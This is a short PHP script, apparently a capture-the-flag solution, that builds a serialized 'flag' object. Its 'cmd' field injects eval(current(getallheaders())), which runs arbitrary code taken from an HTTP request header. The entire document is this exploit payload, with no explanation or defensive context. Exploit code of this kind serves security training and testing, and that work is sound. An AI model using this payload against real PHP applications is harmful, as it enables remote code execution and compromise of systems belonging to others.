<?php
class flag
{}

$x = new flag();
$x->cmd = "\";eval(current(getallheaders()));\"";
echo serialize($x);